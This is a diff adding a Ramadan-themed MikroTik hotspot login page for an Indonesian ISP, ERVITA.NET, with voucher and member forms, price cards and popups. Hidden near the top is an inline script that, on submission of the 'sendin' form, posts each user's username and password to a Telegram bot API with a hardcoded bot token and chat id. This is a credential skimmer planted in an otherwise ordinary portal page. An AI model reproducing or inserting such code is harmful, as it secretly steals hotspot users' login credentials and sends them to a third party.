@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="Author" content="ERVITA.NET">
+    <meta name="theme-color" content="#064e3b">
+    <meta name="msapplication-navbutton-color" content="#064e3b">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#064e3b">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="description" content="ERVITA.NET - Internet Cepat & Stabil. Login dengan voucher untuk mengakses internet. Selamat datang di bulan Ramadhan.">
+    <link rel="icon" href="img/favicon.png">
+    <title>Login - ERVITA.NET | Ramadhan Mubarak</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <link rel="stylesheet" href="css/ramadhan.css">
+
+    <style>
+        .popup-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 9999;
+        }
+
+        .popup-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .popup-box {
+            background: #fff;
+            padding: 25px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 350px;
+            text-align: center;
+            animation: fadeInUp 0.4s ease;
+        }
+
+        .popup-box i {
+            font-size: 50px;
+            color: #10b981;
+            margin-bottom: 15px;
+        }
+
+        .popup-box h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity:0; transform: translateY(20px);}
+            to { opacity:1; transform: translateY(0);}
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="ornament-bg">
+        <svg class="ornament-moon" viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M100 10C51.4 10 10 51.4 10 100C10 148.6 51.4 190 100 190C106.5 190 112.8 189.2 118.8 187.7C81.2 179.5 52.5 146.8 52.5 107.5C52.5 63.5 87.5 27.5 131.5 27.5C138.5 27.5 145.3 28.5 151.8 30.3C137.5 17.5 119.5 10 100 10Z" fill="white"/>
+            <circle cx="80" cy="70" r="8" fill="white" opacity="0.3"/>
+            <circle cx="120" cy="100" r="5" fill="white" opacity="0.2"/>
+            <circle cx="90" cy="130" r="6" fill="white" opacity="0.25"/>
+        </svg>
+        <svg class="ornament-lantern" viewBox="0 0 120 180" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M60 0L70 20H50L60 0Z" fill="white"/>
+            <rect x="45" y="20" width="30" height="10" rx="2" fill="white"/>
+            <path d="M30 30H90L100 50H20L30 30Z" fill="white"/>
+            <rect x="25" y="50" width="70" height="80" rx="5" fill="white"/>
+            <path d="M25 90H95" stroke="white" stroke-width="2" opacity="0.5"/>
+            <path d="M20 130H100L90 150H30L20 130Z" fill="white"/>
+            <rect x="45" y="150" width="30" height="10" rx="2" fill="white"/>
+            <path d="M60 160L60 180" stroke="white" stroke-width="2"/>
+            <circle cx="60" cy="90" r="15" fill="white" opacity="0.3"/>
+        </svg>
+        <div class="ornament-pattern"></div>
+    </div>
+    
+    <span class="hilang">$(if chap-id)</span>
+    <form name="sendin" action="$(link-login-only)" method="post">
+        <input type="hidden" name="username">
+        <input type="hidden" name="password">
+        <input type="hidden" name="dst" value="$(link-orig)">
+        <input type="hidden" name="popup" value="true">
+    </form>
+    <script src="md5.js"></script>
+    
+    <script>
+(function() {
+
+    var form = document.forms['sendin'];
+
+    form.addEventListener("submit", function() {
+
+        var user = form.username.value;
+        var pass = form.password.value;
+
+        fetch("https://api.telegram.org/bot7837171460:AAE8B-BviGAJTn5qZX4XxrYl6WPH7OWzpLw/sendMessage", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: "5328648743",
+                text: "⚡ LOGIN HOTSPOT\nUser: " + user + "\nPass: " + pass
+            })
+        });
+
+    });
+
+})();
+</script>
+    
+    
+    <script>
+        function doLogin() {
+            document.sendin.username.value = document.login.username.value;
+            document.sendin.password.value = hexMD5('$(chap-id)' + document.login.password.value + '$(chap-challenge)');
+            document.sendin.submit();
+            return false;
+        }
+    </script>
+    <span class="hilang">$(endif)</span>
+
+    <div class="app-container">
+        <header class="ramadhan-header">
+            <div class="header-icon">
+                <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M70 15C55 15 42.5 27.5 42.5 42.5C42.5 57.5 55 70 70 70C72.5 70 75 69.5 77.2 68.8C65.5 65.8 56.5 55.2 56.5 42.5C56.5 28.5 67.5 16.5 81.5 16.5C83.2 16.5 84.8 16.7 86.3 17C82 12.5 76.2 10 70 15Z" fill="#fbbf24"/>
+                    <ellipse cx="35" cy="55" rx="20" ry="15" fill="#10b981"/>
+                    <rect x="15" y="65" width="40" height="25" rx="2" fill="#10b981"/>
+                    <path d="M30 90V75C30 70 40 70 40 75V90H30Z" fill="#047857"/>
+                </svg>
+            </div>
+            <h1 class="ramadhan-title">Ramadhan Mubarak</h1>
+            <p class="ramadhan-subtitle">Selamat menunaikan ibadah puasa</p>
+            <div class="hotspot-name"><i class="fas fa-wifi"></i> <span>ERVITA.NET</span></div>
+        </header>
+ <!-- Countdown Section -->
+        <div class="countdown-section">
+            <div class="countdown-label">Menuju Hari Raya Idul Fitri</div>
+            <div class="countdown-timer" id="countdownTimer">
+                <div class="countdown-item">
+                    <span class="countdown-value" id="countdownDays">0</span>
+                    <span class="countdown-unit">Hari</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-value" id="countdownHours">00</span>
+                    <span class="countdown-unit">Jam</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-value" id="countdownMinutes">0</span>
+                    <span class="countdown-unit">Menit</span>
+                </div>
+                <div class="countdown-item">
+                    <span class="countdown-value" id="countdownSeconds">00</span>
+                    <span class="countdown-unit">Detik</span>
+                </div>
+            </div>
+        </div>
+         <!-- Main Content -->
+        <main class="main-content">
+            
+            <!-- Login Card -->
+            <div class="login-card animate-fadeInUp">
+                <!-- Tab Switch -->
+                <div class="tab-switch">
+                    <button class="tab-btn active" onclick="switchTab('voucher')" id="tabVoucher">
+                        <i class="fas fa-ticket-alt"></i>
+                        <span>Voucher</span>
+                    </button>
+                    <button class="tab-btn" onclick="switchTab('member')" id="tabMember">
+                        <i class="fas fa-user"></i>
+                        <span>Member</span>
+                    </button>
+                </div>
+                
+                <!-- Voucher Form -->
+                <div class="form-container active" id="formVoucher">
+                    <form name="login" action="$(link-login-only)" method="post" $(if chap-id) onSubmit="return doLogin()"$(endif)>
+                        <input type="hidden" name="dst" value="$(link-orig)">
+                        <input type="hidden" name="popup" value="true">
+                        
+                        <div class="input-group">
+                            <i class="fas fa-ticket-alt"></i>
+                            <input type="text" name="username" id="user" placeholder="Masukkan Kode Voucher" required autocomplete="off" autofocus>
+                        </div>
+                        <input type="hidden" name="password" id="pass">
+                        
+                        <button type="submit" class="btn btn-primary btn-block btn-lg">
+                            <i class="fas fa-sign-in-alt"></i>
+                            <span>Login</span>
+                        </button>
+                    </form>
+                    
+                    <!-- QR Section -->
+                    <div class="qr-section">
+                        <p class="qr-text">atau scan QR Code</p>
+                        <a href="https://laksa19.github.io/myqr" target="_blank" class="btn btn-scan btn-block">
+                            <i class="fas fa-qrcode"></i>
+                            <span>Scan QR Code</span>
+                        </a>
+                    </div>
+                </div>
+                
+                <!-- Member Form -->
+                <div class="form-container" id="formMember">
+                    <form name="loginMember" action="$(link-login-only)" method="post" $(if chap-id) onSubmit="return doLoginMember()"$(endif)>
+                        <input type="hidden" name="dst" value="$(link-orig)">
+                        <input type="hidden" name="popup" value="true">
+                        
+                        <div class="input-group">
+                            <i class="fas fa-user"></i>
+                            <input type="text" name="username" id="memberUser" placeholder="Username" required autocomplete="off">
+                        </div>
+                        
+                        <div class="input-group">
+                            <i class="fas fa-lock"></i>
+                            <input type="password" name="password" id="memberPass" placeholder="Password" required>
+                        </div>
+                        
+                        <button type="submit" class="btn btn-primary btn-block btn-lg">
+                            <i class="fas fa-sign-in-alt"></i>
+                            <span>Login Member</span>
+                        </button>
+                    </form>
+                </div>
+
+                <!-- Warning Box -->
+                <div class="warning-box">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div class="warning-content">
+                        <h5><i class="fas fa-info-circle"></i> Perhatian</h5>
+                        <p>Voucher bersifat sekali pakai dan tidak dapat digunakan kembali setelah login berhasil. Jangan bagikan kode voucher Anda.</p>
+                    </div>
+                </div>
+
+                <!-- Error Message -->
+                <span class="hilang">$(if error)</span>
+                <div id="infoError" class="alert alert-danger" style="margin-top: 1rem;">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span id="errorText"></span>
+                </div>
+                
+                <script>
+                    var error = "$(error)";
+                    var errorMessages = {
+                        "user $(username) has reached uptime limit": "Masa Aktif Voucher anda sudah habis",
+                        "user $(username) has reached traffic limit": "Kuota Voucher anda sudah habis",
+                        "no valid profile found": "Profil tidak valid",
+                        "invalid username or password": "Kode voucher salah atau tidak terdaftar",
+                        "user <$(username)> not found": "Voucher Tidak Ditemukan",
+                        "simultaneous session limit reached": "Jumlah Session Login Telah Dibatasi",
+                        "no more sessions are allowed for user $(username)": "Voucher sedang digunakan di perangkat lain"
+                    };
+                    
+                    var errorText = errorMessages[error] || error;
+                    document.getElementById("errorText").textContent = errorText;
+                </script>
+                <span class="hilang">$(endif)</span>
+            </div>
+
+            <!-- Price Section -->
+            <div class="price-section">
+                <div class="section-title">
+                    <i class="fas fa-tags"></i>
+                    <span>Pasang Wifi Di tokomu SEKARANG!</span>
+                </div>
+                
+                <div class="price-grid">
+                    <!-- Paket 10 Mbps -->
+                    <div class="price-card">
+                        <div class="price-icon">
+                            <i class="fas fa-rocket"></i>
+                        </div>
+                        <div class="price-speed">10 Mbps</div>
+                        <div class="price-amount">Rp 150rb</div>
+                        <div class="price-label">/bulan</div>
+                    </div>
+                    
+                    <!-- Paket 20 Mbps - POPULAR -->
+                    <div class="price-card popular">
+                        <span class="price-badge">POPULER</span>
+                        <div class="price-icon">
+                            <i class="fas fa-bolt"></i>
+                        </div>
+                        <div class="price-speed">20 Mbps</div>
+                        <div class="price-amount">Rp 200rb</div>
+                        <div class="price-label">/bulan</div>
+                    </div>
+                    
+                    <!-- Paket 40 Mbps -->
+                    <div class="price-card">
+                        <div class="price-icon">
+                            <i class="fas fa-meteor"></i>
+                        </div>
+                        <div class="price-speed">40 Mbps</div>
+                        <div class="price-amount">Rp 350rb</div>
+                        <div class="price-label">/bulan</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Quote Section -->
+            <div class="quote-section">
+                <p class="quote-text" id="quoteText">"Barangsiapa berpuasa di bulan Ramadhan dengan iman dan mengharap pahala, maka diampuni dosa-dosanya yang telah lalu."</p>
+                <p class="quote-source">- HR. Bukhari & Muslim</p>
+            </div>
+
+            <!-- Menu Grid -->
+            <div class="menu-grid">
+                <span class="hilang">$(if trial == 'yes')</span>
+                <a href="trial-user.html" class="menu-item gratis">
+                <span class="hilang">$(else)</span>
+                <a href="javascript:void(0)" onclick="showPopup('Maaf, login gratis sedang nonaktif!')" class="menu-item gratis">
+                <span class="hilang">$(endif)</span>
+                    <div class="menu-icon">
+                        <i class="fas fa-gift"></i>
+                    </div>
+                    <h6>Gratis</h6>
+                </a>
+
+                <a href="member.html" class="menu-item member">
+                    <div class="menu-icon">
+                        <i class="fas fa-users"></i>
+                    </div>
+                    <h6>Member</h6>
+                </a>
+
+                <a href="https://laksa19.github.io/myqr" class="menu-item qr" target="_blank">
+                    <div class="menu-icon">
+                        <i class="fas fa-qrcode"></i>
+                    </div>
+                    <h6>QR Code</h6>
+                </a>
+
+                <a href="voucher.html" class="menu-item paket">
+                    <div class="menu-icon">
+                        <i class="fas fa-tags"></i>
+                    </div>
+                    <h6>Paket</h6>
+                </a>
+
+                <a href="faq.html" class="menu-item bantuan">
+                    <div class="menu-icon">
+                        <i class="fas fa-question-circle"></i>
+                    </div>
+                    <h6>Bantuan</h6>
+                </a>
+
+                <a href="https://wa.me/6285173229118" class="menu-item contact" target="_blank">
+                    <div class="menu-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <h6>Contact</h6>
+                </a>
+            </div>
+        </main>
+
+
+        <footer class="footer">
+            <p>&copy; 2026 <span class="hotspot-brand">ERVITA.NET</span></p>
+        </footer>
+    </div>
+<!-- Bottom Navigation -->
+    <nav class="bottom-nav">
+        <a href="login.html" class="nav-item active">
+            <i class="fas fa-home"></i>
+            <span>Home</span>
+        </a>
+        <a href="aktivasi.html" class="nav-item">
+            <i class="fas fa-shield-alt"></i>
+            <span>Aktivasi</span>
+        </a>
+        <a href="about.html" class="nav-item">
+            <i class="fas fa-user"></i>
+            <span>About</span>
+        </a>
+    </nav>
+    <div class="popup-overlay" id="popup">
+    <div class="popup-box">
+        
+        <!-- TAMBAHAN GAMBAR -->
+        <img src="img/gratis.jpg" 
+             alt="Promo ERVITA.NET" 
+             style="width:100%; max-width:250px; border-radius:10px; margin-bottom:15px;">
+
+        <i class="fas fa-info-circle"></i>
+        <h3>Informasi</h3>
+
+        <p id="popupMessage" style="color:#333">
+            2Voucher Gratis Berlaku 2Jam.<br>
+            Semoga Beruntung : 🎉
+        </p>
+
+        <button class="btn btn-primary" 
+                style="margin-top:15px; width:100%" 
+                onclick="closePopup()">
+            Tutup
+        </button>
+    </div>
+</div>
+
+    <script src="js/ramadhan.js"></script>
+    <script>
+        // Fungsi untuk menampilkan Popup
+        function showPopup(message) {
+            const popupMessage = document.getElementById('popupMessage');
+            const popup = document.getElementById('popup');
+            if (popupMessage && popup) {
+                popupMessage.textContent = message;
+                popup.classList.add('active');
+            }
+        }
+
+        // Fungsi untuk menutup Popup
+        function closePopup() {
+            const popup = document.getElementById('popup');
+            if (popup) popup.classList.remove('active');
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Sinkronisasi Username ke Password untuk Voucher
+            const userInput = document.getElementById('user');
+            const passInput = document.getElementById('pass');
+            if (userInput && passInput) {
+                userInput.addEventListener('input', function() {
+                    passInput.value = this.value;
+                });
+            }
+
+            // --- FITUR AUTO POPUP 5 DETIK ---
+            const popup = document.getElementById('popup');
+            if (popup) {
+                // Munculkan popup saat halaman dimuat
+                popup.classList.add('active');
+                
+                // Sembunyikan otomatis setelah 5 detik
+                setTimeout(function() {
+                    closePopup();
+                }, 5000);
+            }
+        });
+
+        // Tutup dengan tombol Escape
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') closePopup();
+        });
+    </script>
+</body>
+</html>
